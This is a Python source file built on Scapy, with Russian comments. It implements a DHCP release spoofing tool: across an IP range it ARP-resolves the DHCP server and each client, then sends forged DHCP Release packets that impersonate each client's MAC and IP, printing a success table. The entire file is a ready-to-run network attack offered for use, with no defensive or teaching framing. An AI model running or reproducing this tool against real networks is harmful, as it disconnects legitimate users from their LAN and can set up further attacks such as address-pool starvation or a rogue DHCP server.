from scapy.all import *
from colorama import *


def dhcp_release_spoofing(start_ip, end_ip, dhcp_ip, interface):
    start_host = start_ip.split(".")[-1]
    end_host = end_ip.split(".")[-1]
    subnet = start_ip.split(".")[0:3]
    subnet = subnet[0] + "." + subnet[1] + "." + subnet[2] + "."
    sum = (int(end_host) - int(start_host)) + 1
    start_host = int(start_host)
    dhcp_server_ip = dhcp_ip

    dhcp_release_pool = []
    position = 0
    sent_packets = 0  # Создаем счетчик отправленных DHCP Release пакетов
    number = 1

    print(Fore.YELLOW + "    [!] Waiting for a response from the DHCP server ...")
    arp_request = (Ether(dst="ff:ff:ff:ff:ff:ff") /
                   ARP(pdst=dhcp_server_ip))  # Отправляем ARP-запрос DHCP серверу, чтобы узнать его MAC-адрес
    result = srp1(arp_request, timeout=1, iface=interface, verbose=False)
    if result:
        print(Fore.YELLOW + f"    [!] [RECEIVED]")
        print(Fore.GREEN + "\n    [ № ]    [   MAC address   ]    [   IP address   ]    [    Status   ]")
        for received in result:
            if received.haslayer(ARP) and received[ARP].op == 2:
                dhcp_server_mac = received.hwsrc

                for i in range(sum):
                    dhcp_release_pool.append(subnet + str(start_host))  # Формируем список с IP-адресами
                    start_host += 1

                for i in range(sum):
                    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=dhcp_release_pool[position])  # Узнаем MAC-адрес клиента
                    result = srp1(arp_request, timeout=1, iface=interface, verbose=False)

                    if result:
                        for received in result:
                            if received.haslayer(ARP) and received[ARP].op == 2:
                                client_mac = received.hwsrc  # Получаем MAC-адрес клиента
                                client_mac_bytes = bytes.fromhex(client_mac.replace(":", "").replace("-", ""))

                                xid = random.randint(0x00000000, 0xffffffff)
                                release_packet = (Ether(src=client_mac, dst=dhcp_server_mac) /
                                                  IP(src=dhcp_release_pool[position], dst=dhcp_server_ip) /
                                                  UDP(sport=68, dport=67) /
                                                  BOOTP(op=1, chaddr=client_mac_bytes, ciaddr=dhcp_release_pool[position], xid=xid) /
                                                  DHCP(options=[("message-type", "release"),
                                                                ("client_id", b'\x01' + bytes.fromhex(client_mac.replace(':', ''))),
                                                                ("server_id", dhcp_server_ip),
                                                                "end"]))
                                sendp(release_packet, iface=interface, count=1, verbose=False)  # Для DHCP Release (заголовок BOOTP) op указывается как в Request (op=1)

                                print(Fore.WHITE + f"     {number:3}      {client_mac.upper()}       {dhcp_release_pool[position]:^15}         {'Success':^11}")
                                sent_packets += 1
                                position += 1
                                number += 1

                    else:
                        print(Fore.WHITE +    f"     {number:3}      {'Unknown':^18}      {dhcp_release_pool[position]:^15}       {'Unavailable':^11}")
                        position += 1
                        number += 1
    else:
        print(Fore.RED + f"    [-] The DHCP server is not responding!")

    if sent_packets > 0:
        print(Fore.GREEN + f"\n    [+] Successfully! Total number of DHCP Release packets sent: {sent_packets}")